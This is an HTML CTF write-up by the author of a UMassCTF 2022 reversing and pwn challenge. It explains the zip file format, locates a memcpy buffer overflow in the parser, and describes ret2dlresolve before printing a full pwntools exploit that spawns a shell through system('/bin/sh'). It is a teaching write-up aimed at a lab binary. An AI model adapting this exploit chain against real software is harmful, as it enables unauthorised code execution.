@@ -1,0 +1,240 @@
+<head> 
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-5X8D3297QB"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5X8D3297QB');
+</script>
+</head>
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Zip Parser</h1>
+            <h2>April 2022</h2>           
+            <h4>Reverse Engineer Zip Parser + Ret2dlResolve</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+        When a tree falls in the forest with noone around to hear it, some say that no sound is made. Does the same apply to processes without output?
+
+        <br><br>
+        <a href=https://github.com/seal9055/PWN_Zero2Hero/tree/main/umass_22>challenge_files</a>
+        <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+        This is one of the challenges I authored for UMassCTF 2022. I like modelling my challenges after real world scenarios, so I figured a file parser would get pretty close.<br><br>
+
+        Executing the binary does not provide any output, and attempting to pass in commandline arguments or some stdin input does not result in any additional information either. Let's load the binary into our disassembler.<br><br>
+
+        Starting with main, it looks like it starts by reading in 2 values from the user, the first being a size that is then passed to <i>malloc()</i> to allocate the input from the second <i>read()</i> onto the heap. Next the binary is allocating more heap space for 3 different structs, and populates them using the 3 functions <i>parse_head()</i>, <i>parse_centdir</i>, and <i>parse_data()</i>. Finally the binary exits.<br><br>
+
+        The challenge description alongside the non-stripped function names hint that we are dealing with a zip-file parser. Therefore, before moving on to the next functions let's briefly talk about how the zip file format is laid out so we can understand the rest of the challenge a little easier.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/umass_22/zip1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        ZIP is an archive format that makes use of a lossless compression algorithm to compress files to smaller sizes. It uses an lz compression algorithm called DEFLATE for its compression which I briefly describe in my <a href=https://seal9055.com/ctf-writeups/umassctf_2022/coffee_maker>coffee_maker</a> writeup (another challenge I wrote for this CTF).<br><br>
+
+        Since one of the main purposes of zip-archives is to store multiple files together in one archive, it requires a good way to keep track of files, even while compressed. This is where the actual file format comes in. This format has magic bytes to let tools such as the 'file' commandline tool recognize that it is dealing with a zip file. It also describes a specification that lets various zip-parsers efficiently parse the archive and extract information such as the names of the included files and their sizes without requiring the archive to be decompressed.<br><br>
+
+        Unlike most other file formats, when talking about zip, we need to start at the end of the data. The main header which describes many of the offsets required to parse the rest of the file is located at the very end of the file. This header is also called the end of central directory record and its start is indicated by the magic bytes PK\x05\x06. This structure encodes some important information such as the number of files in the archive, the compression method used, the central directory size and the offset to the central directory within the data.<br><br>
+
+        Using the previously calculated values we can now find the central directory listing and loop through all entries using the previous parsed num_files and centdir_size values. This central directory contains most of the meta-data for a given file. This can include access/modification times, the file data length both compressed & uncompressed, and the offset of where this file's data actually starts.<br><br>
+
+        Finally there are the local headers. These describe the compressed data of the files themselves. These data-entries also contain some additional values repeated from the previously listed meta-data such as the compressed/uncompressed sizes or the file name.<br><br>
+
+        The image below showcases how exactly zip-archives are structured.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/umass_22/zip2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Now that we have a general overview of how zip files are structured we can get back to the challenge and look at the remaining functions.<br><br>
+
+        Starting with <i>parse_head()</i>, we can see how the previously described search for the main header is conducted. The parser loops through the entire binary and compares each sequence of bytes with the magic header. Once found it stops and parses the header data structure starting at that location before returning 0. If it does not end up finding these magic bytes, it instead returns 1 to indicate that an error occured.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/umass_22/zip3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Even with some cleanup, binary ninja unfortunately struggled a little to nicely interpret this function. In reality it just loops through the previously parsed number of files, prepared a central directory entry for each of them, and parses its fields from the data. The only interesting part here is that there is a small size check that verifies that none of the compressed files have a size larger than 128.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/umass_22/zip4.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Finally, let's move on to the <i>prase_data()</i> function. It appears to follow the same pattern as the previous 2 functions of just parsing memory and filling up a global structure with parsed data. There is however one very interesting part here. The highlighted call to <i>memcpy()</i> appears to take its size from a length value parsed from the provided data. This is a buffer overflow!<br><br>
+
+        We have found our bug, although there are still a couple of aspects that make exploitation difficult. There were several prior checks that verify that we are dealing with an actual zip-file, so to properly trigger this vulnerability and trigger a segmentation fault we need to provide a malicious but valid zip file. The second issue is that while we could usually just bypass ASLR using a ret2libc attack given that pie is disabled, this is not the case here since there are no functions that can write to stdout and provide us with the leak. This makes exploitation quite a bit more complicated.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/umass_22/zip5.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        There are 2 main ways of dealing with the first issue. We can either take a valid zipfile and edit it to inject our payload, or we can manually reconstruct a simplified zip-file in our exploit. I chose the latter option. The first option is good to achieve a quick poc segfault by manually editing the vulnerable size field, but actually debugging a proper exploit is much easier with the second option.<br><br>
+
+        There are 2 different ways I am aware off on how to deal with the second restriction. We could either write a ropchain that performs a partial overwrite on got entries to execute chosen libc functions or use a ret2dlresolve exploit chain. Once again I opted for the second approach.<br><br>
+
+        The goal of a ret2dlresolve attack is to trick the binary into resolving a function of the attacker's choice, commonly <i>system()</i>, thus completely bypassing ASLR without ever requiring a libc leak. During libc function relocation in dynamically linked elf binaries, the program counter will jump to the function's corresponding PLT entry and execute its handler. This handler requires 3 structures to properly resolve functions, and this is what we will be abusing for our exploit.<br><br>
+
+        <b>.rel.plt</b> => Stores relocation table which maps entries to symbols<br>
+        <b>.strtab</b>  => Table of strings, contains names of libc functions<br>
+        <b>.symtab</b>  => Stores symbol information<br><br>
+
+        The <i>__dl_runtime_resolve()</i> handler that is called to resolve the libc functions takes an offset as an argument that we can corrupt. This offset is generally supposed to point to .rel.plt, but by corrupting it we can have it instead point to an area that we control.<br><br>
+
+        We can then forge fake chunks in memory that represent the above 3 structures. The .ret.plt struct will point to the .symtab, which then points to .strtab, which will contain the string: "system". This will coerce the resolver to retrieve the address of <i>system()</i> and call it instead of the function that was originally supposed to be called.<br><br>
+
+        We can use this to spawn a shell and retrieve the flag. The full exploit is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/umass_22/zip5.png" alt="">
+</div>
+<div class="demo-highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./chal'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+
+<span class="n">comp1</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">comp2</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">800</span><span class="p">)</span>
+<span class="n">filerec_offset</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">80</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="n">elf</span><span class="p">])</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="mi">182</span>
+<span class="n">bss</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+
+<span class="n">dl_resolve_payload</span> <span class="o">=</span> <span class="n">Ret2dlresolvePayload</span><span class="p">(</span><span class="n">elf</span><span class="p">,</span> <span class="s2">"system"</span><span class="p">,</span> <span class="p">[</span><span class="s2">"/bin/sh"</span><span class="p">],</span> <span class="n">bss</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">bss</span><span class="p">,</span><span class="mi">1000</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">ret2dlresolve</span><span class="p">(</span><span class="n">dl_resolve_payload</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">comp1</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span> <span class="o">+</span> <span class="n">filerec_offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'PK</span><span class="se">\x05\x06</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mi">102</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">+</span> <span class="n">comp2</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">dl_resolve_payload</span><span class="o">.</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<style id="css-style">pre { line-height: 125%; }
+td.linenos .normal { color: #586e75; background-color: #073642; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: #586e75; background-color: #073642; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.demo-highlight .hll { background-color: #073642 }
+.demo-highlight { background: #002b36; color: #839496 }
+.demo-highlight .c { color: #586e75; font-style: italic } /* Comment */
+.demo-highlight .err { color: #839496; background-color: #dc322f } /* Error */
+.demo-highlight .esc { color: #839496 } /* Escape */
+.demo-highlight .g { color: #839496 } /* Generic */
+.demo-highlight .k { color: #859900 } /* Keyword */
+.demo-highlight .l { color: #839496 } /* Literal */
+.demo-highlight .n { color: #839496 } /* Name */
+.demo-highlight .o { color: #586e75 } /* Operator */
+.demo-highlight .x { color: #839496 } /* Other */
+.demo-highlight .p { color: #839496 } /* Punctuation */
+.demo-highlight .ch { color: #586e75; font-style: italic } /* Comment.Hashbang */
+.demo-highlight .cm { color: #586e75; font-style: italic } /* Comment.Multiline */
+.demo-highlight .cp { color: #d33682 } /* Comment.Preproc */
+.demo-highlight .cpf { color: #586e75 } /* Comment.PreprocFile */
+.demo-highlight .c1 { color: #586e75; font-style: italic } /* Comment.Single */
+.demo-highlight .cs { color: #586e75; font-style: italic } /* Comment.Special */
+.demo-highlight .gd { color: #dc322f } /* Generic.Deleted */
+.demo-highlight .ge { color: #839496; font-style: italic } /* Generic.Emph */
+.demo-highlight .gr { color: #dc322f } /* Generic.Error */
+.demo-highlight .gh { color: #839496; font-weight: bold } /* Generic.Heading */
+.demo-highlight .gi { color: #859900 } /* Generic.Inserted */
+.demo-highlight .go { color: #839496 } /* Generic.Output */
+.demo-highlight .gp { color: #268bd2; font-weight: bold } /* Generic.Prompt */
+.demo-highlight .gs { color: #839496; font-weight: bold } /* Generic.Strong */
+.demo-highlight .gu { color: #839496; text-decoration: underline } /* Generic.Subheading */
+.demo-highlight .gt { color: #268bd2 } /* Generic.Traceback */
+.demo-highlight .kc { color: #2aa198 } /* Keyword.Constant */
+.demo-highlight .kd { color: #2aa198 } /* Keyword.Declaration */
+.demo-highlight .kn { color: #cb4b16 } /* Keyword.Namespace */
+.demo-highlight .kp { color: #859900 } /* Keyword.Pseudo */
+.demo-highlight .kr { color: #859900 } /* Keyword.Reserved */
+.demo-highlight .kt { color: #b58900 } /* Keyword.Type */
+.demo-highlight .ld { color: #839496 } /* Literal.Date */
+.demo-highlight .m { color: #2aa198 } /* Literal.Number */
+.demo-highlight .s { color: #2aa198 } /* Literal.String */
+.demo-highlight .na { color: #839496 } /* Name.Attribute */
+.demo-highlight .nb { color: #268bd2 } /* Name.Builtin */
+.demo-highlight .nc { color: #268bd2 } /* Name.Class */
+.demo-highlight .no { color: #268bd2 } /* Name.Constant */
+.demo-highlight .nd { color: #268bd2 } /* Name.Decorator */
+.demo-highlight .ni { color: #268bd2 } /* Name.Entity */
+.demo-highlight .ne { color: #268bd2 } /* Name.Exception */
+.demo-highlight .nf { color: #268bd2 } /* Name.Function */
+.demo-highlight .nl { color: #268bd2 } /* Name.Label */
+.demo-highlight .nn { color: #268bd2 } /* Name.Namespace */
+.demo-highlight .nx { color: #839496 } /* Name.Other */
+.demo-highlight .py { color: #839496 } /* Name.Property */
+.demo-highlight .nt { color: #268bd2 } /* Name.Tag */
+.demo-highlight .nv { color: #268bd2 } /* Name.Variable */
+.demo-highlight .ow { color: #859900 } /* Operator.Word */
+.demo-highlight .w { color: #839496 } /* Text.Whitespace */
+.demo-highlight .mb { color: #2aa198 } /* Literal.Number.Bin */
+.demo-highlight .mf { color: #2aa198 } /* Literal.Number.Float */
+.demo-highlight .mh { color: #2aa198 } /* Literal.Number.Hex */
+.demo-highlight .mi { color: #2aa198 } /* Literal.Number.Integer */
+.demo-highlight .mo { color: #2aa198 } /* Literal.Number.Oct */
+.demo-highlight .sa { color: #2aa198 } /* Literal.String.Affix */
+.demo-highlight .sb { color: #2aa198 } /* Literal.String.Backtick */
+.demo-highlight .sc { color: #2aa198 } /* Literal.String.Char */
+.demo-highlight .dl { color: #2aa198 } /* Literal.String.Delimiter */
+.demo-highlight .sd { color: #586e75 } /* Literal.String.Doc */
+.demo-highlight .s2 { color: #2aa198 } /* Literal.String.Double */
+.demo-highlight .se { color: #2aa198 } /* Literal.String.Escape */
+.demo-highlight .sh { color: #2aa198 } /* Literal.String.Heredoc */
+.demo-highlight .si { color: #2aa198 } /* Literal.String.Interpol */
+.demo-highlight .sx { color: #2aa198 } /* Literal.String.Other */
+.demo-highlight .sr { color: #cb4b16 } /* Literal.String.Regex */
+.demo-highlight .s1 { color: #2aa198 } /* Literal.String.Single */
+.demo-highlight .ss { color: #2aa198 } /* Literal.String.Symbol */
+.demo-highlight .bp { color: #268bd2 } /* Name.Builtin.Pseudo */
+.demo-highlight .fm { color: #268bd2 } /* Name.Function.Magic */
+.demo-highlight .vc { color: #268bd2 } /* Name.Variable.Class */
+.demo-highlight .vg { color: #268bd2 } /* Name.Variable.Global */
+.demo-highlight .vi { color: #268bd2 } /* Name.Variable.Instance */
+.demo-highlight .vm { color: #268bd2 } /* Name.Variable.Magic */
+.demo-highlight .il { color: #2aa198 } /* Literal.Number.Integer.Long */</style>
+<br><br><br><br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
